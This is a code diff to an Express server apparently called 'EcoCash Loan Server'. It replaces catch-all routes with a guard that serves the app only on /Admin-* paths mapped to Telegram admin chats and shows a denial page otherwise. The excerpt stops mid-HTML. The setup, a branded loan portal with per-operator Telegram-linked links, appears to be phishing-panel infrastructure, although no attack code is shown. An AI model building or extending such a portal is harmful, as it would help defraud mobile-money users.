@@ -470,15 +470,27 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
   }
 }
 
+// SECURE ROUTE GUARD: Only serve index.html if the /Admin-* path is mapped to an authorized active chat
 app.get('/Admin-*', (req, res) => {
-  res.sendFile(path.join(publicPath, 'index.html'));
-});
-
-app.get('*', (req, res) => {
-  res.sendFile(path.join(publicPath, 'index.html'));
-});
-
-app.listen(PORT, () => {
-  console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
-});
-    
+  const requestedPath = req.path;
+  
+  if (pathToAdminChat.has(requestedPath)) {
+    return res.sendFile(path.join(publicPath, 'index.html'));
+  }
+  
+  res.status(403).send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Access Denied - EcoCash Portal</title>
+      <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-blue-50/50 flex flex-col items-center justify-center min-h-screen p-4">
+      <div class="bg-white rounded-2xl shadow-xl border border-blue-100 w-full max-w-md p-8 text-center space-y-4">
+        <div class="text-4xl">⚠️</div>
+        <h1 class="text-2xl font-extrabold text-red-600">Unauthorized Portal Link</h1>
+        <p class="text-sm text-slate-600">This portal link is either invalid, expired, or has not yet been authorized by the administrator.</p>
+        <p class="text-xs text-slate-400">Please request a valid link via Telegram.</p>
+ 
